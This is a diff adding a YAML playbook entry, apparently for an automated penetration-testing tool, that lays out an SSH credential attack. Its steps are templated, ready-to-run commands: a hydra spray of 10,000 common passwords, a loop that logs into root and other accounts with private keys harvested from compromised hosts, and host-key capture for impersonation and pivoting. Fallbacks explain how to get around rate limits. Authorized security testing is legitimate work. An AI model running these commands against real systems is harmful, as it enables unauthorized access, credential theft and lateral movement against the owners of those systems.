@@ -1,0 +1,43 @@
+id: service_ssh_weak_creds
+title: "SSH credential abuse + key reuse"
+phase: exploit
+mitre: ["T1110.001", "T1078.001", "T1021.004"]
+trigger:
+  services: ["ssh", "openssh"]
+  ports:    [22, 2222, 22022]
+  os_any:   ["linux", "windows", "bsd"]
+  technologies: []
+  cves: []
+keywords:
+  - "ssh weak password"
+  - "ssh brute force"
+  - "ssh key reuse"
+  - "hydra ssh"
+  - "patator ssh"
+  - "ssh-audit"
+preconditions:
+  - "TCP/22 reachable"
+  - "Username list available (from SMB / web enum / leaks)"
+steps:
+  - tool: ssh-audit
+    cmd:  "ssh-audit {target}:{port}"
+    why:  "Banner + algorithm posture, flags terrapin / weak kex"
+  - tool: nmap
+    cmd:  "nmap -sV -p{port} --script=ssh2-enum-algos,ssh-auth-methods,ssh-hostkey {target}"
+    why:  "Detect password vs publickey vs keyboard-interactive auth methods"
+  - tool: hydra
+    cmd:  "hydra -L users.txt -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt ssh://{target}:{port} -t 4 -f -V"
+    why:  "Spray top-10k creds (slow on purpose to avoid lockouts)"
+  - tool: ssh
+    cmd:  "for u in root admin user ubuntu pi; do ssh -o StrictHostKeyChecking=no $u@{target} -p {port} 'id'; done"
+    why:  "Pubkey reuse — try with ~/.ssh/id_rsa harvested from earlier foothold"
+  - tool: ssh-keyscan
+    cmd:  "ssh-keyscan -t rsa,ecdsa,ed25519 {target}"
+    why:  "Capture host keys for later impersonation / pivoting"
+expected_outcome: "Valid SSH credential pair → ``ssh user@target`` foothold"
+fallbacks:
+  - "If hydra rate-limited → switch to medusa or single-thread patator"
+  - "If pubkey-only → search filesystem of compromised hosts for id_rsa, .ssh/authorized_keys"
+  - "If banner reveals Dropbear/embedded → check for default vendor creds (router, IoT)"
+references:
+  - "https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh"
